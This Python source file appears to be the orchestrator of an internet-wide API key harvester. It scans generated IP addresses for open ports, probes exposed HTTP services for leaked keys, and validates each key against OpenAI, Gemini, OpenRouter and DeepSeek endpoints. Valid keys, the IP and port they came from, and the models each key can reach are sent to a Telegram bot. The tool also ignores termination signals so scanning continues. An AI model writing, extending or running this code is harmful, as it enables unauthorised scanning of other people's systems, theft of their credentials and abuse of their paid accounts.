"""
Orchestrator — Decoupled pipelines: scan fast, probe async, never block.
"""
import asyncio
import logging
import os
import time
import signal
from typing import Optional

from ip_generator import IPGenerator
from port_scanner import PortScanner
from http_probe import HTTPProbe, KeyValidator
from telegram_bot import TelegramNotifier

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("orchestrator")


class APIKeyScanner:
    """Decoupled pipelines: scan IPs fast, probe open ports async."""

    def __init__(
        self,
        scan_timeout: float = 0.8,
        http_timeout: float = 8.0,
        max_concurrent_scans: int = 10000,
        max_concurrent_probes: int = 200,
        stats_interval_secs: int = 15,
        use_telegram: bool = True,
    ):
        self.stats_interval = stats_interval_secs
        self.use_telegram = use_telegram

        self.ip_gen = IPGenerator()
        self.port_scanner = PortScanner(timeout=scan_timeout)
        self.http_probe = HTTPProbe(timeout=http_timeout)
        self.key_validator = KeyValidator(timeout=8.0)
        self.telegram = TelegramNotifier() if use_telegram else None

        # Scan pipeline — high concurrency, fast port scanning only
        self.scan_sem = asyncio.Semaphore(max_concurrent_scans)
        # Probe pipeline — limited concurrency, avoids overwhelming slow hosts
        self.probe_sem = asyncio.Semaphore(max_concurrent_probes)

        self.ips_scanned = 0
        self.ports_found = 0
        self.keys_found = 0
        self.keys_valid = 0
        self.start_time: Optional[float] = None
        self._running = False
        self._restart_requested = False

    async def process_one_ip(self, ip: str):
        """Step 1: Scan ports. If open, fire probe as background task."""
        async with self.scan_sem:
            try:
                open_ports = await self.port_scanner.scan_ip(ip)
                self.ips_scanned += 1
                if not open_ports:
                    return

                self.ports_found += len(open_ports)
                if self.ports_found <= 50 or self.ports_found % 20 == 0:
                    logger.info(f"OPEN PORTS on {ip}: {open_ports}")

                # Fire probe as background task (separate semaphore)
                for port in open_ports:
                    asyncio.create_task(self._probe_and_process(ip, port))
            except Exception:
                pass

    async def _probe_and_process(self, ip: str, port: int):
        """Step 2-4: Probe, validate, notify — limited concurrency."""
        async with self.probe_sem:
            try:
                keys = await self.http_probe.probe_ip_port(ip, port)
                if not keys:
                    return

                self.keys_found += len(keys)
                for key in keys:
                    valid = await self.key_validator.validate(key)
                    if valid:
                        self.keys_valid += 1
                        logger.info(f"✅ VALID {valid.provider} key — {ip}:{port}")
                        models = await self._fetch_models(valid)
                        if self.telegram:
                            await self.telegram.notify_key_found(
                                provider=valid.provider,
                                key=valid.key,
                                ip=valid.source_ip,
                                port=valid.source_port,
                                endpoint=valid.endpoint,
                                models=models,
                                validated=True,
                            )
            except Exception:
                pass

    async def _fetch_models(self, key) -> Optional[list[str]]:
        import aiohttp
        from http_probe import VALIDATION_ENDPOINTS
        prov = key.provider
        if prov not in VALIDATION_ENDPOINTS:
            return None
        cfg = VALIDATION_ENDPOINTS[prov]
        url = cfg["url"].format(key=key.key) if "{key}" in cfg["url"] else cfg["url"]
        headers = cfg["headers"](key.key)
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8), ssl=True) as r:
                    if r.status == 200:
                        return self._parse_models(await r.json(), prov)
        except Exception:
            return None

    def _parse_models(self, data: dict, provider: str) -> list[str]:
        try:
            if provider == "OpenAI" and "data" in data:
                return [m["id"] for m in data["data"][:125]]
            if provider == "Gemini" and "models" in data:
                return [m["name"].replace("models/", "") for m in data["models"][:125]]
            if provider == "OpenRouter" and isinstance(data, dict):
                d = data.get("data", {})
                if isinstance(d, dict):
                    d = d.get("models", d)
                if isinstance(d, list):
                    return [m.get("id", str(m)) for m in d[:20]]
            if provider == "DeepSeek" and "data" in data:
                return [m["id"] for m in data["data"][:20]]
        except Exception:
            pass
        return None

    async def _stats_loop(self):
        while self._running:
            await asyncio.sleep(self.stats_interval)
            elapsed = max(time.time() - self.start_time, 0.01)
            rate = self.ips_scanned / elapsed
            logger.info(f"Scanned: {self.ips_scanned:,} | Ports: {self.ports_found} | Keys: {self.keys_found} | Valid: {self.keys_valid} | Rate: {rate:.0f}/s")
            if self.telegram:
                await self.telegram.notify_stats(
                    ips_scanned=self.ips_scanned,
                    keys_found=self.keys_found,
                    keys_valid=self.keys_valid,
                    elapsed_hours=elapsed / 3600,
                )

    async def run(self):
        self._running = True
        self.start_time = time.time()

        logger.info("=" * 60)
        logger.info("API Key Scanner v3.0 — DECOUPLED PIPELINES")
        logger.info(f"Ports: {self.port_scanner.ports}")
        logger.info(f"Scan concurrency: {self.scan_sem._value} | Probe concurrency: {self.probe_sem._value}")
        logger.info("=" * 60)

        if self.telegram:
            await self.telegram.notify_startup(version="3.0 — DECOUPLED")

        asyncio.create_task(self._stats_loop())

        try:
            while self._running:
                ip = self.ip_gen.next_ip()
                asyncio.create_task(self.process_one_ip(ip))

                if self.ips_scanned % 100 == 0:
                    await asyncio.sleep(0)

                if self.ips_scanned % 10000 == 0 and self._restart_requested:
                    logger.info("Restart request — continuing")
                    self._restart_requested = False

        except asyncio.CancelledError:
            logger.info("Cancelled")

    async def handle_sigterm(self):
        if not self._restart_requested:
            logger.info("SIGTERM — continuing scan")
            self._restart_requested = True

    async def cleanup(self):
        elapsed = max(time.time() - self.start_time, 0.01) / 3600 if self.start_time else 0
        logger.info(f"Final: {self.ips_scanned:,} IPs, {self.keys_valid} valid keys in {elapsed:.1f}h")
        if self.telegram:
            await self.telegram.notify_stats(
                ips_scanned=self.ips_scanned,
                keys_found=self.keys_found,
                keys_valid=self.keys_valid,
                elapsed_hours=elapsed,
            )
            await self.telegram.close()


async def main():
    scanner = APIKeyScanner(
        scan_timeout=float(os.getenv("SCAN_TIMEOUT", "0.8")),
        http_timeout=float(os.getenv("HTTP_TIMEOUT", "8.0")),
        max_concurrent_scans=int(os.getenv("MAX_CONCURRENT_SCANS", "10000")),
        max_concurrent_probes=int(os.getenv("MAX_CONCURRENT_PROBES", "200")),
        stats_interval_secs=int(os.getenv("STATS_INTERVAL_SEC", "15")),
        use_telegram=os.getenv("USE_TELEGRAM", "true").lower() == "true",
    )

    try:
        loop = asyncio.get_event_loop()
        loop.add_signal_handler(signal.SIGTERM, lambda: asyncio.ensure_future(scanner.handle_sigterm()))
        loop.add_signal_handler(signal.SIGINT, lambda: asyncio.ensure_future(scanner.handle_sigterm()))
    except (NotImplementedError, AttributeError):
        pass

    try:
        await scanner.run()
    except KeyboardInterrupt:
        logger.info("Interrupted")
    finally:
        await scanner.cleanup()


if __name__ == "__main__":
    asyncio.run(main())
